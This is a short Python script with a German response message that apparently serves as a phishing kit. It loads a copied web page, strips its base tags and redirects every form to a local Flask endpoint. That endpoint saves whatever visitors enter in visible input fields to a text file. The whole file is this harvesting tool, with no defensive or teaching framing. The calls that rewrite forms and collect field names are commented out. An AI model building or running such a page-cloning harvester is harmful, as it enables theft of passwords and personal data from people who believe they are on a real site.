from bs4 import BeautifulSoup
import chardet
from flask import Flask, request, jsonify, render_template, redirect
from flask_cors import CORS
import os 

inputlist =[]
inputnames = []
# Replace 'example.html' with the path to your HTML file
with open('index.html', 'rb') as f:
    data = f.read()
    encoding = chardet.detect(data)['encoding']
    html = data.decode(encoding)

soup = BeautifulSoup(html, 'html.parser')

bases = soup.find_all('base')
forms = soup.find_all('form')
for base in bases:
    base.decompose()

def edit_forms():
    file_path = os.path.join('templates', 'index.html')
    for form in forms:
            form['action'] = '/submit_data'
            form['method'] = 'POST'
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))

def get_vars_for_flask(list1, list2):
    for form in forms:
        inputs = form.find_all('input')
        if inputs:
            for input_field in inputs:
                if input_field.get('type') != 'hidden':
                    if input_field.get("aria-hidden") != "true":
                        if input_field.get("hidden") != "hidden":
                            list1.append(input_field)
                            input_name = input_field.get('name')
                            if input_name:
                                list2.append(input_name)
                        
            print(inputlist)
            print(inputnames)
        else:
            print('No input fields found in form:')
def iniate_flask(variable_names):
    app = Flask(__name__, static_url_path='/static')
    CORS(app)


    @app.route('/')
    def index():
        return render_template('index.html')

    @app.route('/submit_data', methods=['POST'])
    def submit_data():
        # Create an empty dictionary to store the form data
        form_data = {}
        
        # Loop over the variable names and add the form data to the dictionary
        for var_name in variable_names:
            form_data[var_name] = request.form[var_name]
        
        # Write the form data to a file
        with open('user_data.txt', 'a') as file:
            file.write(f'Form Data: {form_data}\n')
        
        response_data = {
            'message': f'Daten gespeichert: {form_data}'
        }
        return jsonify(response_data)

    if __name__ == '__main__':
        app.run(debug=True)


#edit_forms()
#get_vars_for_flask(inputlist, inputnames)
iniate_flask(inputnames)
